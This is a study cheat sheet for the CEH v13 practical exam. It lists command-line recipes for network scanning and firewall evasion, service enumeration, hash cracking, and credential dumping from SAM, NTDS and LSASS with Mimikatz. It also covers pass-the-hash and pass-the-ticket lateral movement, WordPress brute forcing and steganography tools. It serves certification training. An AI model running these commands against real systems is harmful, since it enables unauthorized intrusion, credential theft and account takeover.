# CEH v13 Cheat Sheet

Cheat sheet for CEH v13 Pratical Exam on May 15th, 2026

## Scanning Networks
### Host Discovery
```bash
# -sn disables port scan
# -Pn assumes host is up
nmap -sn -PE [IP]                                   # ICMP Echo ping
nmap -sn -PE [IP RANGE]                             # ICMP Echo sweep
nmap -sn -PP [IP]                                   # ICMP Timestamp ping
nmap -sn -PM [IP]                                   # ICMP Address Mask ping
nmap -sn -PR [IP]                                   # ARP ping
nmap -sn -PU [IP]                                   # UDP ping
nmap -sn -PS [IP]                                   # TCP SYN ping
nmap -sn -PA [IP]                                   # TCP ACK ping
nmap -sn -PO [IP]                                   # IP Protocol ping
nmap -6sn -PA [IP]                                  # IPv6 ping
nmap -sn -PE --reason [IP]                          # Show why host marked alive
nmap -sn -PE --packet-trace --disable-arp-ping [IP] # Trace packets, no ARP

# Save them to a file:
nmap -sn -PE [SUBNET] -oG - | grep "Up" | awk '{print $2}' > live_hosts.txt
nmap -sV -sC -F -iL live_hosts.txt > scan.txt
```

---

### Port Scanning
```bash
# Full/Open
nmap -sT -v [IP]           # TCP Connect (full open)

# Stealth
nmap -sS -v [IP]           # SYN/Half-open stealth scan
nmap -sF -v [IP]           # FIN scan
nmap -sN -v [IP]           # NULL scan
nmap -sX -v [IP]           # Xmas scan (FIN+URG+PSH)
nmap -sM -v [IP]           # TCP Maimon scan (FIN/ACK)
nmap -sA -v [IP]           # ACK flag probe scan
nmap -sA --ttl 100 -v [IP] # TTL-based scan
nmap -sW -v [IP]           # Window scan

# Other
nmap -sU -v [IP]           # UDP scan
nmap -sY -v [IP]           # SCTP INIT scan
nmap -sZ -v [IP]           # SCTP COOKIE ECHO scan
nmap -Pn -p- -sI [IP]      # IDLE/IPID spoofed scan
```

---

### Service & OS Detection
```bash
nmap -sV [IP]                           # Service version detection
nmap -O  [IP]                           # OS detection
nmap -A  [IP]                           # Aggressive (OS+version+scripts+traceroute)
nmap --script smb-os-discovery.nse [IP] # SMB OS discovery (determine the OS, computer name, domain, workgroup, and current time over the SMB protocol 445/139)
```

#### OS TTL Reference
| OS | TTL |
|----|-----|
| Linux | 64 |
| FreeBSD | 64 |
| Windows | 128 |
| OpenBSD | 255 |
| Cisco | 255 |
| Solaris | 255 |
| AIX | 255 |

---

### Performance Tuning
```bash
nmap --max-retries 0 [IP]                        # No retries (fastest)
nmap --max-retries 3 [IP]                        # Reduce retries (default 10)
nmap --min-rate 300 [IP]                         # Min packets per second
nmap --max-rtt-timeout 100ms [IP]                # Max round trip timeout
nmap --min-parallelism 10 [IP]                   # Min parallel probes
```

---

### Evading IDS/Firewall
```bash
nmap -f [IP]                          # Packet fragmentation
nmap -mtu 8 [IP]                      # Custom MTU (8 bytes)
nmap -g 80 [IP]                       # Source port manipulation
nmap -D RND:10 [IP]                   # IP decoy (10 random decoys)
nmap -sT -Pn --spoof-mac 0 [IP]       # Random MAC spoofing
nmap --randomize-hosts [IP]           # Randomize host scan order
nmap --badsum [IP]                    # Bad checksum packets
nmap -Pn -n --disable-arp-ping [IP]   # Suppress ICMP/DNS/ARP
hping3  -a 7.7.7.7 [IP]               # IP address spoofing
```

---

### Hping3 Reference
```bash
hping3 -A  -p 80 [IP]                       # ACK scan port 80
hping3 -2  -p 80 [IP]                       # UDP scan port 80
hping3 -Q -p 139 -s [IP]                    # Collect ISN
hping3 -S  -p 80 --tcp-timestamp [IP]       # Firewall timestamp
```

---

### Port States
| State | Description |
|-------|-------------|
| open | Connection established |
| closed | RST flag received |
| filtered | No response / dropped by firewall |
| unfiltered | Accessible but open/closed unclear (ACK scan only) |
| open\|filtered | No response — firewall may be protecting port |
| closed\|filtered | Only in IP ID idle scans |

### Key Scan Response Logic
| Scan Type | Open Port | Closed Port |
|-----------|-----------|-------------|
| SYN | SYN/ACK | RST |
| ACK | No response (filtered) | RST (not filtered) |
| FIN/NULL/Xmas | No response | RST |
| Maimon | No response | RST |
| UDP | No response | ICMP unreachable |
| SCTP INIT | INIT+ACK | ABORT |
| SCTP COOKIE | No response | ABORT |

## Enumeration

### NetBIOS Enumeration
```bash
# Windows Workflow
nbtstat -a [IP]              # NetBIOS name table of remote machine
nbtstat -c [IP]              # NetBIOS name cache + resolved IPs
net use                      # Connection status, shared folders, network info 
net view \\[HOST]            # List shared resources on remote host 
net view /domain:[DOMAIN]    # List shares by domain

# Kali/Linux Workflow
nmblookup -A [IP]            # NetBIOS name table (nbtstat -a equivalent)
nbtscan [IP]                 # NetBIOS name cache (nbtstat -c equivalent)
smbclient -L //[IP] -N       # List shares (net use / net view equivalent)
enum4linux -a [IP]           # Full enumeration including domain info
enum4linux-ng -A [IP]        # Alternative full enumeration
```
---

### SNMP Enumeration
```bash
snmpwalk -v1 -c public [IP]                   # SNMP v1 walk
snmpwalk -v2c -c public [IP]                  # SNMP v2c walk
nmap -sU -p 161 --script=snmp-processes [IP]  # SNMP via Nmap
```
---

### LDAP Enumeration
```bash
nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' [IP] 
```

----

### NFS Enumeration
```bash
nmap -p 2049 [IP]                   # Check NFS port
showmount -e [IP]                   # Show exported directories
rpcinfo -p   [IP]                   # RPC info
```

**SuperEnum:**
```bash
# Performs basic enumeration of any open port, including 2049
> cd SuperEnum
> echo "" >> Target.txt
> ./superenum
```

**RPCScan:**
```bash
> cd RPCScan
> python3 rpc-scan.py –rpc
```
---

### DNS Enumeration

**Nmap DNS**
```
nmap --script=broadcast-dns-service-discovery 
nmap -sU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=
```

**Zone Transfer (Linux)**

Process of transferring a copy of the DNS zone file from the primary DNS server to a secondary DNS server. If the DNS transfer setting is enabled on the target DNS server, it will give DNS information; if not, it will return an error saying it has failed or refuses the zone transfer.
```bash
> dig [HOST] OR dig ns [HOST]            # Find the name servers
> dig @[NS RECORD NAME] [HOST] axfr      # Attempt zone transfer (AXFR = ALL records are returned to secondary DNS server)
```
**Zone Transfer (Windows)**
```
> nslookup
> set querytype=soa
> [HOST]
> ls -d [PRIMARY NAME SERVER]
```

**Cache Snooping**

Technique whereby an attacker queries the DNS server for a specific cached DNS record
```
dig @[IP of DNS SERVER] [TARGET DOMAIN] A +norecurse    # Send a non-recursive query by setting the Recursion Desired (RD) bit in the query header to 0
dig @[IP of DNS SERVER] [TARGET DOMAIN] A +recurse      # Send a recursive query to determine the time the DNS record resides in cache
```

**DNSSEC Zone Walking**

Technique whereby an attacker attempts to obtain internal records of the DNS server if the DNS zone is not properly configured
```
ldns-walk @[IP of DNS SERVER] [TARGET DOMAIN]
dnsrecon -d [TARGET DOMAIN] -z
```

**Amass**

Tool used to map the target network and discover potential attack surfaces
```
amass enum -passive -d [TARGET DOMAIN] -src                                            # Perform passive enumeration
amass enum -active -d [TARGET DOMAIN] -brute -w /usr/share/wordlist/amass/all.txt      # Perform active enumeration through brute-forcing
amass track -config /root/amass/config.ini -dir amass4owasp -d [TARGET DOMAIN] -last 2 # Track or compare the last two enumeration scans
```

---

### SMTP Enumeration
```bash
nmap -p 25 --script=smtp-enum-users [IP]     # List mail users
nmap -p 25 --script=smtp-open-relay [IP]     # Check open relay
nmap -p 25 --script=smtp-commands [IP]       # List SMTP commands
```

---

### SMB Enumeration
```bash
nmap -p 445 -A                           # SMB OS banner grab + info
nmap -p 139,445 --script smb-enum-shares # this one is cool
nmap -p 139,445 --script smb-enum-users 
nmap -p 445 --script smb-vuln*           # SMB vulnerability scan

# smbmap
smbmap -H [IP]                           # similar to smb-enum-shares

# Accessing smb
smbclient //[IP]/[SHARE]
```

---

### NTP Enumeration
```bash
# Trace NTP chain back to the primary source
nptrace [-n] [-m maxhosts] [servername/IP_address]             

# Monitors operation of the NTP daemon (ntpd) in current state and requests changes in that state
ntpdc [-ilnps] [-c command] [host] [...]
ntpdc [-46dilnps] [-c command] [host/ip_address]

# Monitors NTP daemon (ntpd) operations and determines performance
ntpq [-inp] [-c command] [host] [...]
ntpq [-46dinp] [-c command] [host/ip_address]
```

---

### ISAKMP/IKE (VPN) Enumeration
```bash
nmap -sU -p 500 [IP]
ike-scan -M [IP]
```

---

### VoIP Enumeration
```bash
svmap                                    # SIP device scanner
```

---

### Unix/Linux User Enumeration
```bash
/usr/bin/rusers -al [HOST]               # Remote logged-in users
rwho [HOST]                              # LAN logged-in users
finger -l @ [HOST]                       # Detailed user info
finger -s @ [HOST]                       # Summary user info
```

---

### SSH Enumeration
```bash
nmap -p 22 -sV 
nmap -p 22 --script ssh-auth-methods 
nmap -p 22 --script ssh-brute 
```
---

### Sublist3r (Subdomain Enumeration)
```
sublist3r -d [DOMAIN]                   # Basic command
sublist3r -d [DOMAIN] -o [OUTPUT_FILE]  # Save results to file
sublist3r -v -d [DOMAIN]                # Verbose output
```
---

### Gobuster (Directory Enumeration)
```
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
gobuster dir -u [URL] -w [WORDLIST]              # Basic command
gobuster dir -u [URL] -w [WORDLIST] -x php,html  # File extnsion
gobuster dir -u https://[URL] -w [WORDLIST] -k   # HTTPS Insecure
```

### What Each Protocol Gives You
| Protocol | Ports | Data Obtained |
|----------|-------|--------------|
| NetBIOS | 137, 138, 139 | Domain computers, shares, policies, passwords |
| SNMP | 161, 162 | Device info, ARP/routing tables, traffic stats, users |
| LDAP | 389 | Usernames, addresses, departments, server names |
| NFS | 2049 | Exported dirs, connected clients, IPs, shared data |
| DNS | 53 | Subdomains, hostnames, IPs, mail servers, aliases |
| SMTP | 25, 587, 2525 | Valid email users, open relays |
| NTP | 123 | Connected hosts, IPs, system names, OSes |
| ISAKMP | 500 | VPN gateway presence, encryption/hashing algorithms |
| VoIP | 5060, 5061, 2000, 2001 | Gateways, IP-PBX, softphones, user extensions |
| RPC | 135 | Vulnerable services |
| SMB | 445, 139 | OS info, shares, users, vulnerabilities |


## Password Cracking
### Hash ID
```
hashid -j [HASH]                    # Identify hash + JtR format
hashid -m [HASH]                    # Identify hash + Hashcat mode
```

---

### John the Ripper (JtR)
```
john --single passwd                              # Single crack mode attack on file passwrd
john --wordlist=rockyou.txt hash.txt              # Dictionary attack using wordlist rockyou.txt
john --incremental hash.txt                       # Brute force using incremental mode
john --format=NT hash.txt                         # Specify hash format
john --show hash.txt                              # Show cracked passwords

# Convert files to JtR compatible hashes
pdf2john file.pdf > file.hash
ssh2john id_rsa > ssh.hash
zip2john file.zip > zip.hash
wpa2john capture.pcap > wpa.hash

locate *2john*                                    # See all converters
```

#### **JtR Notes**
- One of the most effective and widely used rulesets is best64.rule
- We can generate wordlists using CeWL, a tool that scans potential words from a company’s website and saves them in a separate list
```
cewl https://www.example.com -d 4 -m 6 --lowercase -w wordlist.txt
# -d = spider depth
# -m = minimum word length
# --lowercase = store in lowercase
# -w = output file
```
---

### Hashcat
```
hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]                        # Basic command (-a signifies dictionary attack)
hashcat -a 3 -m 0 [HASH] '?u?l?l?l?l?d?s'                                     # Mask attack
hashcat -a 0 -m 0 [HASH] rockyou.txt -r /usr/share/hashcat/rules/best64.rule  # Use a ruleset
ls -l /usr/share/hashcat/rules                                                # List available rules

echo "e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme" > hash.txt          # Taking into account salting
hashcat -a 0 -m 110 hash.txt /usr/share/wordlists/rockyou.txt
```

#### Common Hash Types
| Hash | Hashcat Mode | Example |
|------|-------------|---------|
| MD5 | 0 | `5f4dcc3b5aa765d61d8327deb882cf99` |
| SHA1 | 100 | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| NTLM | 1000 | `64f12cddaa88057e06a81b54e73b949b` |
| NetNTLMv2 | 5600 | `user::domain:challenge:hash` |
| DCC2 | 2100 | `$DCC2$10240#user#hash` |
| SHA512crypt (Linux) | 1800 | `$6$...` |
| bcrypt | 3200 | `$2a$...` |
| WPA/WPA2 | 2500 | PMKID/handshake |


#### Hashcat Mask Characters
| Mask | Character Set |
|------|--------------|
| ?u | Uppercase A-Z |
| ?l | Lowercase a-z |
| ?d | Digits 0-9 |
| ?s | Symbols |
| ?a | All of the above |

## Extracting Credentials
### Windows

The Security Account Manager (SAM) is a database file in Windows operating systems that stores user account credentials. User passwords are stored as hashes in the registry, typically in the form of either LM or NTLM hashes. The SAM file is located at `%SystemRoot%\system32\config\SAM` and is mounted under HKLM\SAM. Viewing or accessing this file requires SYSTEM level privileges.

#### Registry Hive Dump (requires SYSTEM)
```
# On target Windows machine, use reg.exe to copy registry hives in C:\WINDOWS\system32\
reg.exe save hklm\sam C:\sam.save            # Local account hashes
reg.exe save hklm\system C:\system.save      # Boot key (needed to decrypt SAM)
reg.exe save hklm\security C:\security.save  # Cached domain creds, DPAPI

# Host SMB share on Kali to receive files
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/

# Transfer files from target (i.e. run these commands on target)
move sam.save \\\CompData
move security.save \\\CompData
move system.save \\\CompData

# Dump hashes from hives on Kali
# Hash format (uid:rid:lmhash:nthash)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

#### Remote SAM Dump via NetExec
```bash
netexec smb [IP] --local-auth -u [USER] -p [PASSWORD] --sam
```

#### NTDS.dit Dump (Domain Controller)

NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at `%systemroot%/ntds` on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain
```bash
netexec smb [IP] -u [USER] -p [PASSWORD] -M ntdsutil
```

---

#### Mimikatz
```bash
mimikatz.exe                  # Running this command starts Mimikatz
privilege::debug
sekurlsa::logonpasswords      # Dump plaintext passwords + hashes from LSASS
sekurlsa::credman             # Dump credential manager
sekurlsa::ekeys               # Dump Kerberos encryption keys
sekurlsa::tickets /export     # Export Kerberos tickets (.kirbi)
lsadump::sam                  # Dump SAM database
lsadump::dcsync /user:Administrator  # DCSync attack
```

---

### Linux

#### Linux Credential Files
| File | Contents |
|------|----------|
| `/etc/passwd` | User account info (no passwords on modern systems) |
| `/etc/shadow` | Password hashes (root readable only) |
| `/etc/security/opasswd` | Previous/old passwords |

#### Linux Hash Format
```
$<id>$<salt>$[HASH]
```
| ID | Algorithm |
|----|-----------|
| $1 | MD5 |
| $5 | SHA-256 |
| $6 | SHA-512 |
| $y | yescrypt (default modern) |

#### Cracking Linux Credentials
```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt
```

---

### Brute Forcing with Hydra
```bash
hydra -L users.txt -P passwords.txt ssh://10.129.42.197
hydra -L users.txt -P passwords.txt rdp://10.129.42.197
hydra -L users.txt -P passwords.txt smb://10.129.42.197
hydra -C user_pass.txt ssh://10.129.42.197   # Credential stuffing user:pass list
```


## System Hacking Attacks

### Pass the Hash (PtH) 

#### Using Mimikatz (Windows)
```
privilege::debug
sekurlsa::pth /user:julio /rc4:[HASH] /domain:inlanefreight.htb /run:cmd.exe
```
- `/user`: the user name we want to impersonate.
- `/rc4` or `/NTLM`: NTLM hash of the user's password.
- `/domain`: Domain the user to impersonate belongs to. In the case of a local user account, we can - use the computer name, localhost, or a dot (.).
- `/run`: The program we want to run with the user's context (if not specified, it will launch cmd.exe).

#### Using Impacket (Linux)
```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

#### Using Netexec (Linux)
```
# Spray across subnet
netexec smb 172.16.1.0/24 -u Administrator -d . -H [HASH]

# Local auth across subnet
netexec smb 172.16.1.0/24 -u Administrator -H [HASH] --local-auth

# Execute command
netexec smb [IP] -u Administrator -d . -H [HASH] -x whoami
```

#### Using Evil-WinRM (Linux)
```
# Local account
evil-winrm -i [IP] -u Administrator -H [HASH]

# Domain account
evil-winrm -i [IP] -u administrator@inlanefreight.htb -H [HASH]
```


### Pass the Ticket (PtT) Windows

#### 1. Export Kerberos Tickets from Windows

**Mimikatz:**
```
mimikatz.exe
privilege::debug
sekurlsa::tickets /export        # exports .kirbi files
sekurlsa::ekeys                  # dump AES/RC4 keys
```
**Rubeus:**
```
Rubeus.exe dump /nowrap          # dump all tickets as Base64
```

#### 2. OverPass the Hash (Pass the Key)

**Mimikatz (RC4):**
```
sekurlsa::pth /domain:domain.htb /user:username /ntlm:[HASH]
```
**Rubeus (AES256 — preferred, less detectable):**
```
Rubeus.exe asktgt /domain:domain.htb /user:username /aes256:[HASH] /nowrap
```

#### 3. Pass the Ticket

**Rubeus — request TGT and inject immediately:**
```
Rubeus.exe asktgt /domain:domain.htb /user:username /rc4:[HASH] /ptt
```
**Rubeus — inject existing ticket:**
```
Rubeus.exe ptt /ticket:<base64>
Rubeus.exe ptt /ticket:ticket.kirbi
```
**Mimikatz — inject .kirbi:**
```
kerberos::ptt "C:\path\to\ticket.kirbi"
```
**Convert .kirbi to Base64 (PowerShell):**
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

#### 4. Lateral Movement via PowerShell Remoting

**Mimikatz path:**
```
# 1. Import ticket in mimikatz
kerberos::ptt "ticket.kirbi"
# 2. Exit mimikatz, launch PowerShell from same cmd window
powershell
Enter-PSSession -ComputerName DC01
```
**Rubeus path:**
```
# 1. Create sacrificial process
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# 2. In new window, request TGT and inject
Rubeus.exe asktgt /user:username /domain:domain.htb /aes256:[HASH] /ptt
# 3. Launch PowerShell
powershell
Enter-PSSession -ComputerName DC01
```

#### Key Notes
| Item | Detail |
|------|--------|
| TGT | Used to request access to any resource |
| TGS | Used for a specific service only |
| `.kirbi` ending in `$` | Computer account ticket |
| `krbtgt` ticket | That user's TGT |
| RC4 vs AES256 | AES256 preferred — RC4 triggers encryption downgrade alert |
| Mimikatz PtT | Requires admin rights |
| Rubeus PtT | Does not require admin rights |
| Ports | TCP 5985 (HTTP) / 5986 (HTTPS) for WinRM/PSRemoting |


## Wireshark

### Display Filters 
```
# IP Filters
ip.addr == 192.168.1.1          # Filter any traffic to/from IP
ip.src == 192.168.1.1           # Filter source IP
ip.dst == 192.168.1.1           # Filter destination IP
ip.addr == 192.168.1.0/24       # Filter entire subnet
!(ip.addr == 192.168.1.1)       # Exclude IP

# Protocol Filters
http
https
ftp

# Port Filters
tcp.port == 80                  # TCP port
udp.port == 53                  # UDP port

# Packet/Frame Filters
frame.number == 500             # Specific frame number
frame.len >= 1000               # Frame length greater than 1000 bytes
frame.time_delta > 1            # Time delta between frames

# TCP Filters
tcp.flags.syn == 1              # SYN packets
tcp.flags.ack == 1              # ACK packets
tcp.flags.reset == 1            # RST packets (connection resets)
tcp.flags.fin == 1              # FIN packets

# HTTP Filters
http.request                    # HTTP requests only
http.response                   # HTTP responses only
http.request.method == "GET"    # GET requests
http.request.method == "POST"   # POST requests, catch form submissions
http.response.code == 200       # HTTP 200 OK
http.response.code == 404       # HTTP 404 Not Found
http.response.code == 401       # HTTP 401 Unauthorized
http.host == "example.com"      # Filter by host header
http.request.uri contains "login"  # URI contains string
```

### OSI Layer Reference in Wireshark
| Layer | Wireshark Section | Shows |
|-------|------------------|-------|
| Layer 1 - Physical | Frame | Frame number, size, timing |
| Layer 2 - Data Link | Ethernet | Source/destination MAC |
| Layer 3 - Network | Internet Protocol | Source/destination IP |
| Layer 4 - Transport | TCP/UDP | Ports, flags, sequence numbers |
| Layer 5-7 - Application | HTTP/FTP/SMB etc | Protocol specific data |

### Useful Menu Actions
| Action | Location |
|--------|----------|
| File properties / pcap info | Statistics → Capture File Properties |
| Find packet | Edit → Find Packet |
| Mark/unmark packet | Right-click → Mark/Unmark |
| Apply field as filter | Right-click → Apply as Filter |
| Filter conversation | Analyse → Conversation Filter |
| Follow TCP stream | Analyse → Follow → TCP Stream |
| Follow UDP stream | Analyse → Follow → UDP Stream |
| Follow HTTP stream | Analyse → Follow → HTTP Stream |
| Go to specific packet | Go → Go to Packet |
| Protocol hierarchy | Statistics → Protocol Hierarchy |
| Conversations | Statistics → Conversations |
| Endpoints | Statistics → Endpoints |
| IO Graph | Statistics → IO Graph |
| Export HTTP objects | File → Export Objects → HTTP |

## WPScan
```
# Basic Scanning
wpscan --url http://[HOST or IP]                           # Basic scan
wpscan --url http://[HOST or IP]  --disable-tls-checks     # Ignore SSL errors
wpscan --url http://[HOST or IP]  -v                       # Verbose output

# Enumerate Users
wpscan --url http://[HOST or IP] --enumerate u

# Password Attacks
wpscan --url http:// -U admin -P rockyou.txt                             # Single user
wpscan --url http:// -U user1,user2 -P rockyou.txt                       # Multiple Users
wpscan --url http:// -U admin -P rockyou.txt --password-attack wp-login  # Specify attack method
wpscan --url http:// -U admin -P rockyou.txt --password-attack xmlrpc    # Specify attack method

wpscan --url http:// --detection-mode passive    # Passive only (stealthy)
wpscan --url http:// --detection-mode aggressive # Aggressive (more results)
wpscan --url http:// --detection-mode mixed      # Both (default)
```

### WordPress Attack Flow
```bash
# Step 1 — Basic recon
wpscan --url http://

# Step 2 — Enumerate users and plugins aggressively
wpscan --url http:// --enumerate u,ap,at --detection-mode aggressive

# Step 3 — Brute force discovered users
wpscan --url http:// -U  -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64
```

### Key Things WPScan Finds
| Finding | What It Means |
|---------|--------------|
| WordPress version | Check for known CVEs |
| XML-RPC enabled | Allows brute force via xmlrpc.php — harder to block |
| Upload dir listing | May expose uploaded files/shells |
| robots.txt entries | Reveals hidden paths like /wp-admin/ |
| Outdated plugins | Most common WordPress attack vector |
| Config backups | May contain DB credentials |
| Users identified | Targets for password attack |

## Steganography & Cryptography Cheat Sheet

---

### SNOW / StegSnow (Whitespace Steganography)
Hides data in whitespace characters (tabs/spaces) at end of lines in text files.

**Commands (use `stegsnow` on Kali, `snow` on Windows):**
```bash
# Hide message in a text file
stegsnow -C -m "secret message" -p "password" input.txt output.txt

# Extract hidden message
stegsnow -C -p "password" output.txt

# Hide without password
stegsnow -C -m "secret message" input.txt output.txt

# Extract without password
stegsnow -C output.txt
```

#### Key Flags
| Flag | Description |
|------|-------------|
| `-C` | Compress data before hiding |
| `-m` | Message to hide |
| `-p` | Password for encryption |
| `-l` | Line length limit |

---

### OpenStego (Image Steganography)
Hides data inside image files (PNG, BMP, JPG).

**Launch:**
```bash
java -jar ~/Downloads/openstego-0.8.6.jar
```

**Embed (Hide data in image):**
1. Open OpenStego
2. Select **Data Hiding** → **Hide Data** tab
3. **Message File** → select file to hide
4. **Cover File** → select carrier image (use PNG)
5. **Output File** → set output image name
6. Set password if desired
7. Click **Embed Message**

**Extract (Recover hidden data):**
1. Select **Data Hiding** → **Extract Data** tab
2. **Input File** → select steganographic image
3. **Output Folder** → where to save extracted file
4. Enter password if one was set
5. Click **Extract Message**

**Watermarking:**
1. Select **Watermarking** → **Generate Signature** tab
2. Load image and set watermark
3. Click **Generate**
4. To verify, use **Verify Watermark** tab

**Key Notes:**
| Item | Detail |
|------|---------|
| Best format | PNG — JPG compression destroys hidden data |
| No password | Leave password blank if none was set |
| Output file | Always specify a new filename, don't overwrite cover image |
| File size | Output image will be slightly larger than cover image |

---

### CyberChef (Encoding/Decoding/Encryption)
**Access:** https://gchq.github.io/CyberChef

**How to Use:**
1. Open CyberChef in browser
2. **Input** box (top right) — paste your data
3. **Operations** panel (left) — search and drag operations to Recipe
4. **Recipe** panel (middle) — your chain of operations
5. **Output** box (bottom right) — results appear automatically
6. Click **Bake** to manually trigger if auto-bake is off

#### Common Operations with Sample Values
| Operation | Sample Input | Sample Output |
|-----------|-------------|---------------|
| From Base64 | `SGVsbG8gV29ybGQ=` | `Hello World` |
| To Base64 | `Hello World` | `SGVsbG8gV29ybGQ=` |
| From Hex | `48 65 6c 6c 6f` | `Hello` |
| To Hex | `Hello` | `48 65 6c 6c 6f` |
| ROT13 | `Uryyb Jbeyq` | `Hello World` |
| MD5 | `Hello World` | `b10a8db164e0754105b7a99be72e3fe5` |
| SHA1 | `Hello World` | `0a4d55a8d778e5022fab701977c5d840bbc486d0` |
| SHA256 | `Hello World` | `a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e` |
| From Binary | `01001000 01100101 01101100 01101100 01101111` | `Hello` |
| URL Decode | `Hello%20World%21` | `Hello World!` |
| From Charcode | `72 101 108 108 111` | `Hello` |
| XOR (key=1) | `Hello` | `49 64 6d 6d 6e` |

**Magic Operation (Auto-detect):**
1. Search "Magic" → drag to Recipe
2. Paste unknown encoded string in Input
3. Increase **Intensity** slider for deeper analysis
4. CyberChef will suggest encoding type and decoded result

---

### VeraCrypt (Full Disk / Volume Encryption)

**Create Encrypted Volume (GUI):**
1. Open VeraCrypt → **Create Volume**
2. Select **Create an encrypted file container**
3. Choose **Standard VeraCrypt volume**
4. Set file location and name
5. Choose encryption algorithm (AES default)
6. Set volume size
7. Set strong password
8. Move mouse randomly to generate entropy → **Format**

**Mount Volume (GUI):**
1. Select a drive slot
2. Click **Select File** → choose container
3. Click **Mount** → enter password
4. Use mounted drive normally
5. Click **Dismount** when done

**Hidden Volume:**
1. During creation select **Hidden VeraCrypt volume**
2. Creates two volumes with two passwords
3. Outer volume for plausible deniability
4. Inner hidden volume contains real data

#### Encryption Algorithms
| Algorithm | Notes |
|-----------|-------|
| AES | Default, fastest |
| Serpent | Slower, more secure |
| Twofish | Good alternative |
| AES-Twofish-Serpent | Cascaded, most secure, slowest |

---

### CryptoForge (File Encryption)

**GUI Workflow — Encrypt:**
1. Right-click file → **Encrypt**
2. Enter passphrase
3. File saved as `.cfe` extension

**GUI Workflow — Decrypt:**
1. Right-click `.cfe` file → **Decrypt**
2. Enter passphrase
3. Original file restored

**CLI:**
```bash
# Encrypt file
cryptoforge encrypt -p "password" file.txt

# Decrypt file
cryptoforge decrypt -p "password" file.txt.cfe

# Shred (securely delete)
cryptoforge shred file.txt
```

#### Key Features
| Feature | Description |
|---------|-------------|
| Algorithms | Blowfish, Triple DES, CAST, 3DES |
| File shredding | Secure deletion of originals |
| Text encryption | Encrypt clipboard text |
| `.cfe` extension | CryptoForge encrypted file format |

---

### Quick Reference — Which Tool for What
| Scenario | Tool |
|----------|------|
| Hide text in whitespace of .txt file | SNOW/StegSnow |
| Hide file inside an image | OpenStego |
| Decode Base64/Hex/ROT13 quickly | CyberChef |
| Encrypt entire drive or create encrypted container | VeraCrypt |
| Encrypt individual files with passphrase | CryptoForge |
| Watermark an image | OpenStego |
| Plausible deniability encryption | VeraCrypt hidden volume |
| Auto-detect unknown encoding | CyberChef Magic |


